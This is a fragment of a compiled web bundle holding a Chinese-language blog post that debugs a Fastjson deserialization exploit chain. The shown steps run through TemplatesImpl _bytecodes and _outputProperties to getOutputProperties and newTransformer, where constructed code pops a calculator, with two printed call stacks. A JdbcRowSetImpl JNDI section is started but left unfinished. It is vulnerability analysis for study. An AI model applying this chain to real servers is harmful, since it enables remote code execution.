operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("197")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" JSON "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("alibaba"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("fastjson"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nmain"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("34")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Demo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("demo2"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br")])]),t("p",[s._v("之后我们返回上层，这里就把base64解码之后的数据返回给变量"),t("code",[s._v("val")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/YcAb15O9KLBhriD.png",alt:"image-20201207210916872"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/BomUjPXNiGhdILp.png",alt:"image-20201207211122498"}})]),s._v(" "),t("p",[s._v("逐层返回到"),t("code",[s._v("DefaultFieldDeserializer#parseField")]),s._v("，现在我们已经通过解析获得了"),t("code",[s._v("_bytecodes")]),s._v("对应的值"),t("code",[s._v("val")]),s._v("，在下面这个断点的地方会对其进行赋值：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/WVJFkdAlmOvGZoM.png",alt:"image-20201207211415827"}})]),s._v(" "),t("p",[s._v("跟一下这个方法，最后调用到了"),t("code",[s._v("field.set")]),s._v("将解析出的"),t("code",[s._v("val")]),s._v("赋值到之前生成对象中：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/UWYZVQ892HlGT17.png",alt:"image-20201207212011265"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/nYXQoMwWKVld45s.png",alt:"image-20201207212352692"}})]),s._v(" "),t("p",[s._v("再层层返回到"),t("code",[s._v("JavaBeanDeserializer#deserialze")]),s._v("这个方法中，此时对于"),t("code",[s._v("_bytecodes")]),s._v("来说解析已经完成，我们继续往下调试，经过"),t("code",[s._v("scanSymbol")]),s._v("的处理之后得到了第二个键名"),t("code",[s._v("_name")]),s._v("，整个过程和上述基本一致，笔者就不重复分析一遍了，我们要分析的重点是第三个键名"),t("code",[s._v("_proPerties")]),s._v("的处理过程。")]),s._v(" "),t("p",[s._v("回到"),t("code",[s._v("JavaBeanDeserializer#deserialze")]),s._v("之后循环继续循环扫描解析，获得"),t("code",[s._v("_outputProperties")]),s._v("这个key：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/HMyOaZfkXgtJNEj.png",alt:"image-20201207220135573"}})]),s._v(" "),t("p",[s._v("继续往下调试到"),t("code",[s._v("parseField")]),s._v("，然后跟进：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/qIxED4dYGPyXc6j.png",alt:"image-20201207220344872"}})]),s._v(" "),t("p",[s._v("获取到对应的"),t("code",[s._v("fieldDeserializer")]),s._v("之后执行"),t("code",[s._v("DefaultFieldDeserializer#parseField")]),s._v("，接着跟进到"),t("code",[s._v("setValue")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/BjZR5GKYtgLPFIM.png",alt:"image-20201207220747958"}})]),s._v(" "),t("p",[s._v("继续跟进，就会发现它首先获取到了"),t("code",[s._v("_outputProperties")]),s._v("对应的"),t("code",[s._v("getter")]),s._v("方法：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/suhiM9yltLkKJ2v.png",alt:"image-20201207221003564"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/jsfatIrwoevFk19.png",alt:"image-20201207221020424"}})]),s._v(" "),t("p",[s._v("至于为什么会获取到它的"),t("code",[s._v("getter")]),s._v("方法我们在第一篇文章中就已经说过前提条件了，而且在上文中的分析过程中也说明了哪些"),t("code",[s._v("setter")]),s._v("和"),t("code",[s._v("getter")]),s._v("方法会被添加到"),t("code",[s._v("fieldList")]),s._v("中，这里就不赘述了。与"),t("code",[s._v("_bytecodes")]),s._v("不同的是"),t("code",[s._v("_outputProperties")]),s._v("会因为"),t("code",[s._v("method!=null")]),s._v("和"),t("code",[s._v("fieldInfo.getOnly")]),s._v("而进入对应的分支中：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/taVPC2bG4JQcXoM.png",alt:"image-20201207221400302"}})]),s._v(" "),t("p",[s._v("然后调用了"),t("code",[s._v("getOutputProperties.invoke")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/Ik7DZdg2ExReyOt.png",alt:"image-20201207221606099"}})]),s._v(" "),t("p",[s._v("接着跟进，然后就会触发"),t("code",[s._v("getOutputProperties")]),s._v("方法：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/gnZle6aOGoJQ2Nd.png",alt:"image-20201207221729055"}})]),s._v(" "),t("p",[s._v("此时的函数调用栈如下：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\nsetValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)\nparseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)\nparseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\ndeserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\ndeserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\ndeserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\nparseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:137, JSON (com.alibaba.fastjson)\nparse:193, JSON (com.alibaba.fastjson)\nparseObject:197, JSON (com.alibaba.fastjson)\nmain:34, Demo (com.demo2)\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br")])]),t("p",[s._v("再跟进"),t("code",[s._v("newTransformer")]),s._v("方法，之后就是我们前置知识中所分析的调用链，直至触发我们所构造的恶意代码，弹出计算器：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/07/DXbTfZjt3wo9exE.png",alt:"image-20201207221947458"}})]),s._v(" "),t("p",[s._v("最后的函数调用栈：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("getTransletInstance:456, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)\nnewTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)\ngetOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\nsetValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)\nparseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)\nparseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\ndeserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\ndeserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\ndeserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)\nparseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:137, JSON (com.alibaba.fastjson)\nparse:193, JSON (com.alibaba.fastjson)\nparseObject:197, JSON (com.alibaba.fastjson)\nmain:34, Demo (com.demo2)\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br")])]),t("h2",{attrs:{id:"基于jdbcrowsetimpl的jndi"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#基于jdbcrowsetimpl的jndi"}},[s._v("#")]),s._v(" 基于JdbcRowSetImpl的JNDI")]),s._v(" "),t("p",[s._v("JNDI有两种利用方法：LDAP和RMI")]),s._v(" "),t("p",[s._v("笔者这里使用的是基于RMI的JNDI利用方式(LDAP还没学会，逃")]),s._v(" "),t("h3",{attrs:{id:"环境配置-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境配置-2"}},[s._v("#")]),s._v(" 环境配置")]),s._v(" "),t("p",[s._v("……未完待续，有时间再更💫")])])}),[],!1,null,null,null);a.default=e.exports}}]);